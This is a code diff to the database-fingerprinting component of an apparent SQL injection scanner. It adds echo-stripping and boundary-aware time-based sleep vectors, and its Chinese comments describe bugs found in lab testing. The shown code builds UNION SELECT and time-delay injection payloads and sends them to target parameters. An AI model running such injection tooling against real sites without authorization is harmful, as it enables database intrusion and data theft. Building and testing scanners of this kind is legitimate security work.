@@ -12,6 +12,8 @@ import { binaryGuessColumns } from './columnGuess.js';
 // 「超时失败」当成「延迟命中」→ 误定库 → payload 族错配 → 整轮漏检。
 import { isUnusableResponse } from './egressOpts.js';
 import { _colGuessCache, colGuessScopeKey } from './Extractor.js';
+import { unionDebug, unionDebugEnabled } from './unionDebug.js';
+import { stripEchoedPayload } from './echoStrip.js';
 import { WRAP, WRAP_NOCAST, HIGH_FREQ_DBMS, fromDummy, resolveFromClause } from './DialectSqlBuilder.js';
 
 // [⑬] DialectSqlBuilder 收敛：WRAP/HIGH_FREQ_DBMS/fromDummy 原定义于此，现已收敛到
@@ -89,15 +91,25 @@ export class DBFingerprinter {
         const fromDummySql = resolveFromClause(dbms, ctx?.config?.unionFrom);
         // [CRS-FIX 2026-09-10] 补闭合前缀（同 ORDER BY 探针）：否则 UNION 整句落在引号内
         const payload = `${point.originalValue || '1'}${boundary} UNION SELECT ${cols}${fromDummySql}-- -`;
+        const sent = obf(payload);
         const res = await sendInjection(
           httpClient,
           ctx,
-          buildInjectionRequest(target, point, obf(payload))
+          buildInjectionRequest(target, point, sent)
         );
-        const body = String(res?.data ?? '');
+        // [ECHO-FIX 2026-09-18] 先剔除「响应里回显的本条 payload」，再取 `__S__…__E__` 标记。
+        // 目标把注入值原样打回页面时（实测 blackbox-lab 真 MySQL 回显 `sql=…`），页面里会出现
+        // **两份**标记：一份来自被回显的 SQL 文本本身（`__S__',CAST((version()) AS CHAR),'__E__`），
+        // 一份来自真正执行出来的结果行。`match` 取第一处 → 永远拿到 SQL 文本那份 → 18 个库的
+        // sig 全部落空 → 版本回显定库通道在回显型目标上**整条失效**（实测 verFp 18/18 未命中），
+        // 只能退化到报错/时间向量定库，而这两条通道正是误判 ClickHouse/DB2 的发生地。
+        const body = stripEchoedPayload(String(res?.data ?? ''), sent);
         // D6: 大小写不敏感匹配（免疫 lowercase/uppercase/mixedcase tamper 破坏标记）
         const m = body.match(/__S__(.*?)__E__/is);
         const ver = m ? m[1] : '';
+        if (unionDebugEnabled()) {
+          unionDebug(`verFp ${dbms} echo=${m ? 'Y' : 'N'} 取到值=${JSON.stringify(ver.slice(0, 60))} sig命中=${info.sig.test(ver)}`);
+        }
         if (info.sig.test(ver)) {
           // [P1-FIX 2026-09-05] 一并返回解析后的版本：原实现拿到版本串只用于定库即丢弃，
           // 引擎无法按版本选 payload/枚举 SQL（MSSQL<2017 无 string_agg、MySQL<5.7 用 password 列）
@@ -163,17 +175,24 @@ export class DBFingerprinter {
   // 有效阈值 = 基线RTT + 配置阈值：延时信号必须显著超出该目标的正常往返，而非绝对墙钟。
   async _fingerprintByTime(ctx, httpClient, target, point, obf, config, baselineRtt = 0) {
     const orig = point.originalValue || '1';
+    // [CTX-FIX 2026-09-18] 闭合前缀必须带进向量：向量顺序即优先级，只有每条都能真正执行时，
+    // 「谁延时」才等于「谁是目标库」。不带 boundary 时字符串型点上 MySQL 向量落在字面量内
+    // （恒不延时），反而让自带引号的靠后向量（ClickHouse/H2）在真 MySQL 上睡成功 → 误定库。
+    const bd = typeof point.boundary === 'string' ? point.boundary : '';
     const sleepSec = config?.fingerprintSleepSec ?? 1;
     const thresholdMs = config?.fingerprintTimeThresholdMs ?? 800;
     const effThreshold = baselineRtt + thresholdMs;
+    const dbg = unionDebugEnabled();
+    if (dbg) unionDebug(`timeFp 起点 boundary=${JSON.stringify(bd)} baseRtt=${baselineRtt}ms 阈值=${effThreshold}ms sleep=${sleepSec}s`);
     for (const { dbms, payload } of TIME_VECTORS) {
-      const filled = obf(fillPayload(payload, { orig, sleep: sleepSec }));
+      const filled = obf(fillPayload(payload, { orig, bd, sleep: sleepSec }));
       const t0 = Date.now();
       const res = await sendInjection(
         httpClient,
         ctx,
         buildInjectionRequest(target, point, filled)
       );
+      if (dbg) unionDebug(`timeFp ${dbms} ms=${Date.now() - t0} status=${res?.status ?? '-'} unusable=${res ? isUnusableResponse(res) : 'null'}`);
       if (res && !isUnusableResponse(res) && Date.now() - t0 >= effThreshold) {
         // [OPT-FIX 2026-09-08] 串行复验防瞬时毛刺误判：基线 RTT 很小的目标上阈值余量低
         // （实测 L04：RTT 14ms、阈值 814ms），GC/调度尖峰即可单次击穿 → 误定库（实测误判
